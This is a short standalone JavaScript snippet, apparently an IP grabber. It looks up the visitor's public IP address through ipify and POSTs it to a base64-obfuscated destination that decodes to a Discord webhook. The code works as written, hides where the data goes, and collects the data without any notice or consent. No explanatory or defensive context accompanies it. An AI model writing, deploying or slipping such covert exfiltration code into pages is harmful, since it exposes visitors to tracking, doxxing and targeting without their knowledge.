fetch("https://api.ipify.org?format=json")
    .then((response) => response.json())
    .then((data) => {
        fetch(atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTA3NTk0OTkzOTAwMTE1MTUyOC9IckQ5ZmwxVEZacG9Hb28zcXFpU0lncENsTzhDMl9WLXBkQmJiTlFQcFVBU2t0RS1JdDJqSWJRY1ZiQjRrSEctOFcwNg=="), {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify({
                content: data.ip,
            }),
        });
    });
